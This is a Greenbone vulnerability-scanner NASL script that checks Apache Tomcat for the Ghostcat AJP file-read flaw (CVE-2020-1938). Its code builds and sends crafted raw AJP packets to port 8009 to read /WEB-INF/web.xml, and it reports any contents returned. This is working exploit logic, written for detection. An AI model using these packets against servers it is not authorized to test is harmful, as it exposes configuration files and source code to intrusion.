if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.143545" );
	script_version( "2021-07-22T02:00:50+0000" );
	script_tag( name: "last_modification", value: "2021-07-22 02:00:50 +0000 (Thu, 22 Jul 2021)" );
	script_tag( name: "creation_date", value: "2020-02-21 06:01:21 +0000 (Fri, 21 Feb 2020)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-02-24 12:15:00 +0000 (Wed, 24 Feb 2021)" );
	script_cve_id( "CVE-2020-1938" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Apache Tomcat AJP RCE Vulnerability (Ghostcat)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2020 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_jserv_ajp_detect.sc" );
	script_require_ports( "Services/ajp13", 8009 );
	script_require_keys( "apache/ajp/detected" );
	script_tag( name: "summary", value: "Apache Tomcat is prone to a remote code execution vulnerability
  (dubbed 'Ghostcat') in the AJP connector." );
	script_tag( name: "vuldetect", value: "Sends a crafted AJP request and checks the response." );
	script_tag( name: "insight", value: "Apache Tomcat server has a file containing vulnerability, which can be used by
  an attacker to read or include any files in all webapp directories on Tomcat, such as webapp configuration files
  or source code." );
	script_tag( name: "affected", value: "Apache Tomcat versions prior 7.0.100, 8.5.51 or 9.0.31 when the AJP connector
  is enabled.

  Other products like JBoss or Wildfly which are using Tomcat might be affected as well." );
	script_tag( name: "solution", value: "Update Apache Tomcat to version 7.0.100, 8.5.51, 9.0.31 or later. For other products
  using Tomcat please contact the vendor for more information on fixed versions." );
	script_xref( name: "URL", value: "https://lists.apache.org/thread.html/r7c6f492fbd39af34a68681dbbba0468490ff1a97a1bd79c6a53610ef%40%3Cannounce.tomcat.apache.org%3E" );
	script_xref( name: "URL", value: "https://www.chaitin.cn/en/ghostcat" );
	script_xref( name: "URL", value: "https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487" );
	script_xref( name: "URL", value: "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" );
	script_xref( name: "URL", value: "https://securityboulevard.com/2020/02/patch-your-tomcat-and-jboss-instances-to-protect-from-ghostcat-vulnerability-cve-2020-1938-and/" );
	script_xref( name: "URL", value: "https://tomcat.apache.org/tomcat-7.0-doc/changelog.html" );
	script_xref( name: "URL", value: "https://tomcat.apache.org/tomcat-8.5-doc/changelog.html" );
	script_xref( name: "URL", value: "https://tomcat.apache.org/tomcat-9.0-doc/changelog.html" );
	exit( 0 );
}
require("byte_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("dump.inc.sc");
require("http_func.inc.sc");
port = service_get_port( default: 8009, proto: "ajp13" );
hosts_ip = make_list( get_host_ip() );
if(defined_func( "get_host_names" )){
	hosts_ip = make_list( hosts_ip,
		 get_host_names() );
	hosts_ip = nasl_make_list_unique( hosts_ip );
}
local_ip = this_host();
local_len = strlen( local_ip );
file = "/WEB-INF/web.xml";
for host_ip in hosts_ip {
	host_len = strlen( host_ip );
	ajp_data = raw_string( 0x02, 0x02, 0x00, 0x08, "HTTP/1.1", 0x00, 0x00, 0x01, "/", 0x00, mkword( local_len ), local_ip, 0x00, 0xff, 0xff, mkword( host_len ), host_ip, 0x00, 0x00, 0x50, 0x00, 0x00, 0x02, 0xa0, 0x0b, mkword( host_len ), host_ip, 0x00, 0x00, 0x0f, "Accept-Encoding", 0x00, 0x00, 0x08, "identity", 0x00, 0x0a, 0x00, 0x0f, "AJP_REMOTE_PORT", 0x00, 0x00, 0x05, "38434", 0x00, 0x0a, 0x00, 0x22, "javax.servlet.include.servlet_path", 0x00, 0x00, 0x10, file, 0x00, 0x0a, 0x00, 0x21, "javax.servlet.include.request_uri", 0x00, 0x00, 0x01, "1", 0x00, 0xff );
	pkt_len = strlen( ajp_data );
	ajp_pkt = raw_string( 0x12, 0x34, mkword( pkt_len ), ajp_data );
	sock = open_sock_tcp( port );
	if(!sock){
		continue;
	}
	send( socket: sock, data: ajp_pkt );
	recv = recv( socket: sock, length: 8192 );
	if(recv && strlen( recv ) >= 7){
		status = getword( blob: recv, pos: 5 );
		if(hexstr( recv[4] ) == "04" && status == 200){
			report = "It was possible to read the file \"" + file + "\" through the AJP connector.\n\nResult:\n\n" + recv;
			security_message( port: port, data: report );
			close( sock );
			exit( 0 );
		}
		if(hexstr( recv[4] ) == "04" && status != 403){
			report = "The returned status is '" + status + "', which should be '403' on a patched system, when trying to " + "read a file which indicates that the installation is vulnerable.";
			security_message( port: port, data: report );
			close( sock );
			exit( 0 );
		}
	}
	ajp_data = raw_string( 0x02, 0x02, 0x00, 0x08, "HTTP/1.1", 0x00, 0x00, 0x05, "/asdf", 0x00, mkword( local_len ), local_ip, 0x00, 0xff, 0xff, mkword( host_len ), host_ip, 0x00, 0x00, 0x50, 0x00, 0x00, 0x09, 0xa0, 0x06, 0x00, 0x0a, "keep-alive", 0x00, 0x00, 0x0f, "Accept-Language", 0x00, 0x00, 0x0e, "en-US,en;q=0.5", 0x00, 0xa0, 0x08, 0x00, 0x01, 0x30, 0x00, 0x00, 0x0f, "Accept-Encoding", 0x00, 0x00, 0x13, "gzip, deflate, sdch", 0x00, 0x00, 0x0d, "Cache-Control", 0x00, 0x00, 0x09, "max-age=0", 0x00, 0xa0, 0x0e, 0x00, 0x07, "Mozilla", 0x00, 0x00, 0x19, "Upgrade-Insecure-Requests", 0x00, 0x00, 0x01, 0x31, 0x00, 0xa0, 0x01, 0x00, 0x09, "text/html", 0x00, 0xa0, 0x0b, mkword( host_len ), host_ip, 0x00, 0x0a, 0x00, 0x21, "javax.servlet.include.request_uri", 0x00, 0x00, 0x01, "/", 0x00, 0x0a, 0x00, 0x1f, "javax.servlet.include.path_info", 0x00, 0x00, 0x10, file, 0x00, 0x0a, 0x00, 0x22, "javax.servlet.include.servlet_path", 0x00, 0x00, 0x01, "/", 0x00, 0xff );
	pkt_len = strlen( ajp_data );
	ajp_pkt = raw_string( 0x12, 0x34, mkword( pkt_len ), ajp_data );
	send( socket: sock, data: ajp_pkt );
	recv = recv( socket: sock, length: 8192 );
	close( sock );
	if(!recv || strlen( recv ) < 7){
		continue;
	}
	status = getword( blob: recv, pos: 5 );
	if(hexstr( recv[4] ) == "04" && status == 200){
		report = "It was possible to read the file \"" + file + "\" through the AJP connector.\n\nResult:\n\n" + recv;
		security_message( port: port, data: report );
		exit( 0 );
	}
	if(hexstr( recv[4] ) == "04" && status != 403){
		report = "The returned status is '" + status + "', which should be '403' on a patched system, when trying to " + "read a file which indicates that the installation is vulnerable.";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

